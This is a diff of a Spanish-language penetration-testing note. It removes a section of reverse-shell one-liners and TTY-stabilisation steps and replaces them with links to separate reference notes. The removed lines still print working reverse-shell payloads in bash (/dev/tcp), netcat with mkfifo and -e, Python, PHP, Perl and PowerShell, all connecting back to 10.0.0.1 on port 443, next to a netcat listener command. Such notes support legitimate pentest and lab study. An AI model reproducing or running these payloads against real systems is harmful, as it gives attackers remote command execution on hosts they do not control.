@@ -37,52 +37,12 @@ Escalada. Sin TTY, `sudo -l` falla si pide contraseña.
 
 Escuchar primero: `nc -lvnp 443`. Se prefiere 443 o 80 — son los puertos que casi siempre salen.
 
-`bash -i >& /dev/tcp/10.0.0.1/443 0>&1`
-El clásico. Requiere `bash` real, no `sh`. En muchos contextos hay que envolverlo: `bash -c 'bash -i >& /dev/tcp/10.0.0.1/443 0>&1'`.
-
-`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.0.1 443 >/tmp/f`
-Con `nc` sin `-e`, que es la versión que trae casi toda distribución moderna. Deja un FIFO en `/tmp`: hay que borrarlo.
-
-`nc -e /bin/sh 10.0.0.1 443`
-Solo con `netcat-traditional`. Corto, pero suele no estar.
-
-`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.0.0.1",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'`
-Python. **Ya viene con TTY**, lo que ahorra todo el paso 3.
-
-`php -r '$s=fsockopen("10.0.0.1",443);exec("/bin/sh -i <&3 >&3 2>&3");'`
-PHP. Útil porque en un servidor web el binario está garantizado.
-
-`perl -e 'use Socket;$i="10.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`
-Perl. Presente en sistemas viejos donde no hay Python 3.
-
-`powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.0.0.1',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length);$s.Flush()}"`
-Windows. Va codificado con `-enc` en UTF-16LE si hay filtro de firma.
+> [!info] Los one-liners viven en el dominio de shells
+> Reverse shell por lenguaje (`bash`/`sh`/`nc`/`python`/`php`/`perl`/`ruby`/`socat`/PowerShell) y **cuál elegir según lo que hay en el objetivo**: [[Reverse y bind shells - matriz de referencia]]. El criterio de subir de comando a sesión: [[Command injection - a shell interactiva]]. Se centralizan ahí para no mantener dos copias.
 
 ## 3. Promover a TTY completo
 
-Sin TTY no andan `sudo`, `ssh` ni nada a pantalla completa, y `Ctrl-C` mata la sesión entera.
-
-`python3 -c 'import pty;pty.spawn("/bin/bash")'`
-Primer paso, el más habitual.
-
-`script -qc /bin/bash /dev/null`
-Alternativa sin Python. Parte de `util-linux`, casi siempre presente.
-
-Después, desde la shell **local** (no la remota):
-
-```
-Ctrl-Z
-stty raw -echo; fg
-```
-
-Y de vuelta en la remota:
-
-```
-export TERM=xterm-256color
-stty rows 50 cols 200
-```
-
-Los valores de `rows` y `cols` se sacan de `stty size` en la terminal local. Sin esto, `vim` y `less` dibujan mal.
+Sin TTY no andan `sudo`, `ssh` ni nada a pantalla completa, y `Ctrl-C` mata la sesión entera. El procedimiento completo —PTY, `stty raw -echo`, `TERM`/`rows`/`cols`, y el atajo de `socat`/`pwncat`— en [[Estabilización de shell - matriz de referencia]].
 
 ## 4. Webshell en vez de sesión
 
